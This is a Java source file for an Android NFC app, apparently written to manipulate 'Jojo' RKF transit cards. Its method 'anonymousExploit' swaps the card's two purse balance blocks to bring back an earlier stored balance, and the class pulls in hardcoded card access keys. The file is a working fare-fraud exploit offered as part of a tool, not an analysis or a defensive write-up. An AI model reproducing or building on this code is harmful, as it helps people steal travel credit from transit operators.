package com.vsttrfk.git64.cards;

import java.io.IOException;

import android.nfc.TagLostException;

import com.vsttrfk.git64.auth.IRKFAuthable;
import com.vsttrfk.git64.tools.BlockId;
import com.vsttrfk.git64.tools.Util;

public class JojoCard extends AbstractRKFCard {


	private byte[][] data;
	
	/**
	 * Create card object from nfc-source
	 * 
	 * @param mfc
	 */
	public JojoCard(byte[][] data) throws TagLostException, IOException {
		super(data);
		this.data = super.getData();
	}

	
	public boolean anonymousExploit() {
		final int i = getBlock(BlockId.PURSE);

		// determine if the card was already sploited

		// switch places between the two balance blocks.
		final byte[] temp = data[i + 1];
		data[i + 1] = data[i + 2];
		data[i + 2] = temp;

		return true;
	}
	
	protected int getBalanceBlock(){
		final int i = getBlock(BlockId.PURSE);
		final String blockSelect = Util.toHexString(data[12][3]);
		int result = 0 ;
		if (blockSelect.charAt(1) == '2') {
			result = i + 2;
		}
		if (blockSelect.charAt(1) == '1') {
			result = i + 1;
		}

		return result;
	}


	public byte[][] getKeysA() {
		return IRKFAuthable.KEYS_A_JOJO;
	}


	public byte[][] getKeysB() {
		return IRKFAuthable.KEYS_B_JOJO;
	}
	

}
